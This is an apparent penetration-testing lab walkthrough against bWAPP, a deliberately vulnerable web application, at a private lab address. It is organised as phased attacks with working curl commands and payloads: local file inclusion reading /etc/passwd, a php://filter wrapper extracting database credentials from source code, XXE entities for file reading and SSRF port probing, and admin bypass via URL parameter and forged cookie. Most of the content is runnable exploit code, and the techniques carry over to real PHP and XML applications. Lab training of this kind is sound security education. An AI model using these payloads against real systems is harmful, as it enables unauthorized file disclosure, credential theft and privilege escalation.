# bWAPP — Full Attack Walkthrough (Refined) | 2026-03-19-001

## 1. Target Overview
- **Target IP:** 10.10.30.128
- **Application:** bWAPP (Buggy Web Application)
- **Security Level:** Medium (Transitioning from Low to Medium for bypass testing)
- **Primary Vectors:** LFI, XXE, SSRF, and Broken Authentication.

## 2. Phase 1: Authentication & Session Setup

Establish an authenticated session. By default, setting `security_level=0` allows for testing baseline vulnerabilities before escalating to medium-level filter bypasses.

```bash
curl -c cookies.txt -X POST http://10.10.30.128/bWAPP/login.php \
  -d "login=bee&password=bug&security_level=0&form=submit"
```

## 3. Phase 2: Local File Inclusion (LFI)

### 3.1 — Direct File Read (Low Security)
Verify basic LFI by reading `/etc/passwd`.

```bash
curl -b cookies.txt \
  "http://10.10.30.128/bWAPP/rlfi.php?language=/etc/passwd&action=go"
```

### 3.2 — Source Code Exfiltration via PHP Wrappers
Use the `php://filter` wrapper to retrieve the base64-encoded source of sensitive PHP files. This bypasses execution and allows reading of database credentials.

```bash
# Exfiltrate database configuration
curl -b cookies.txt \
  "http://10.10.30.128/bWAPP/rlfi.php?language=php://filter/convert.base64-encode/resource=admin/settings.php&action=go" \
  | grep -oP '[A-Za-z0-9+/]{30,}={0,2}' | head -1 | base64 -d
# Result: DB_USER=root, DB_PASSWORD=""
```

## 4. Phase 3: XXE & SSRF

### 4.1 — XXE File Exfiltration
Exploit `xxe-2.php` by injecting a SYSTEM entity. The extracted file content (e.g., `/etc/passwd`) is reflected in the application's "secret" field for the user.

**Payload (XML):**
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE reset [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<reset><login>bee</login><secret>&xxe;</secret></reset>
```

**Execution:**
```bash
curl -b cookies.txt -X POST http://10.10.30.128/bWAPP/xxe-2.php \
  -H "Content-Type: text/xml; charset=UTF-8" \
  --data-raw '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE reset [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><reset><login>bee</login><secret>&xxe;</secret></reset>'
```

### 4.2 — SSRF via XXE (Internal Port Probing)
Use the same XXE vector to make the server perform requests to internal services (e.g., MySQL on port 3306).

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE probe [
  <!ENTITY ssrf SYSTEM "http://127.0.0.1:3306/">
]>
<reset><login>bee</login><secret>&ssrf;</secret></reset>
```
*Note: A successful connection to an open port like 3306 will often return a "parse error" if the service banner is not valid XML, confirming the port is open.*

## 5. Phase 4: Broken Authentication

### 5.1 — URL Parameter Manipulation (Low Security)
Bypass the admin portal check by directly setting the `admin` parameter in the URL.

```bash
curl -b cookies.txt "http://10.10.30.128/bWAPP/smgmt_admin_portal.php?admin=1"
# Result: "You unlocked this page using an URL manipulation."
```

### 5.2 — Cookie Manipulation (Medium Security)
At medium security, the application checks for an `admin` cookie. Forge this cookie to gain administrative access.

```bash
# Set security_level=1 (Medium)
curl -c cookies_med.txt -X POST http://10.10.30.128/bWAPP/login.php \
  -d "login=bee&password=bug&security_level=1&form=submit"

# Access with forged admin=1 cookie
curl -b cookies_med.txt --cookie "admin=1" \
  "http://10.10.30.128/bWAPP/smgmt_admin_portal.php"
# Result: "You unlocked this page using a cookie manipulation."
```

## 6. Summary of Exploits

| # | Vulnerability | Vector | Technique |
|---|---|---|---|
| 1 | **LFI** | `rlfi.php` | `php://filter` wrapper for source disclosure. |
| 2 | **XXE** | `xxe-2.php` | SYSTEM entity for local file exfiltration. |
| 3 | **SSRF** | `xxe-2.php` | HTTP SYSTEM entity for internal port probing. |
| 4 | **Broken Auth** | `smgmt_admin_portal.php` | URL parameter `admin=1` manipulation. |
| 5 | **Broken Auth** | `smgmt_admin_portal.php` | Cookie `admin=1` forgery (Medium Security). |
